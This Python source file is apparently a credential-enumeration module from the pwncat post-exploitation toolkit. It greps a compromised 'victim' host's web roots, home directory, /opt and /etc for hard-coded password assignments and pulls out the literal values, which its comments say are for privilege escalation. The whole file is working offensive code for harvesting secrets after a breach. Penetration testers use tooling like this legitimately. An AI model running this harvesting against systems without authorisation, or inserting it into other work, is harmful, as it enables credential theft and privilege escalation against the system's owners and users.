#!/usr/bin/env python3
import dataclasses
import os
import re
from typing import Generator, Optional, List

from colorama import Fore

import pwncat
from pwncat.enumerate import FactData

name = "pwncat.enumerate.passwords"
provides = "configuration.password"
per_user = True
always_run = False


@dataclasses.dataclass
class Password(FactData):

    path: str
    value: Optional[str]
    lineno: int
    line: str
    # users which we know *dont* have this password
    invalid: List[str]

    def __str__(self):
        if self.value is not None:
            return (
                f"{Fore.YELLOW}{repr(self.value)}{Fore.RESET} from "
                f"{Fore.CYAN}{self.path}{Fore.RESET}:{Fore.BLUE}{self.lineno}{Fore.RESET}"
            )
        else:
            return (
                "Possible password at "
                f"{Fore.CYAN}{self.path}{Fore.RESET}:{Fore.BLUE}{self.lineno}{Fore.RESET}"
            )

    @property
    def description(self):
        return self.line


def enumerate() -> Generator[FactData, None, None]:
    """
    Enumerate possible passwords in various files across the system
    :return:
    """

    # The locations we will search in for passwords
    locations = ["/var/www", "$HOME", "/opt", "/etc"]
    # Known locations which match this search but don't contain useful entries
    blacklist = ["openssl.cnf", "libuser.conf"]
    # The types of files which are "code". This means that we only recognize the
    # actual password if it is a literal value (enclosed in single or double quotes)
    code_types = [".c", ".php", ".py", ".sh", ".pl", ".js", ".ini", ".json"]
    grep = pwncat.victim.which("grep")

    if grep is None:
        return

    command = f"{grep} -InriE 'password[\"'\"'\"']?\\s*(=>|=|:)' {' '.join(locations)} 2>/dev/null"
    with pwncat.victim.subprocess(command, "r") as filp:
        for line in filp:
            line = line.decode("utf-8").strip().split(":")
            if len(line) < 3:
                print(line)
                continue
            path = line[0]
            lineno = int(line[1])
            content = ":".join(line[2:])

            password = None

            # Ensure this file isn't in our blacklist
            # We will still report it but it won't produce actionable passwords
            # for privesc because the blacklist files have a high likelihood of
            # false positives.
            if os.path.basename(path) not in blacklist:
                # Check for simple assignment
                match = re.search(r"password\s*=(.*)", content, re.IGNORECASE)
                if match is not None:
                    password = match.group(1).strip()

                # Check for dictionary in python with double quotes
                match = re.search(r"password[\"']\s*:(.*)", content, re.IGNORECASE)
                if match is not None:
                    password = match.group(1).strip()

                # Check for dictionary is perl
                match = re.search(r"password[\"']?\s+=>(.*)", content, re.IGNORECASE)
                if match is not None:
                    password = match.group(1).strip()

                # Don't mark empty passwords
                if password is not None and password == "":
                    password = None

                if password is not None:
                    _, extension = os.path.splitext(path)

                    # Ensure that this is a constant string. For code file types,
                    # this is normally indicated by the string being surrounded by
                    # either double or single quotes.
                    if extension in code_types:
                        if password[-1] == ";":
                            password = password[:-1]
                        if password[0] == '"' and password[-1] == '"':
                            password = password.strip('"')
                        elif password[0] == "'" and password[-1] == "'":
                            password = password.strip("'")
                        else:
                            # This wasn't assigned to a constant, it's not helpful to us
                            password = None

                    # Empty quotes? :(
                    if password == "":
                        password = None

            # This was a match for the search. We  may have extracted a
            # password. Either way, log it.
            yield Password(path, password, lineno, ":".join(line), [])
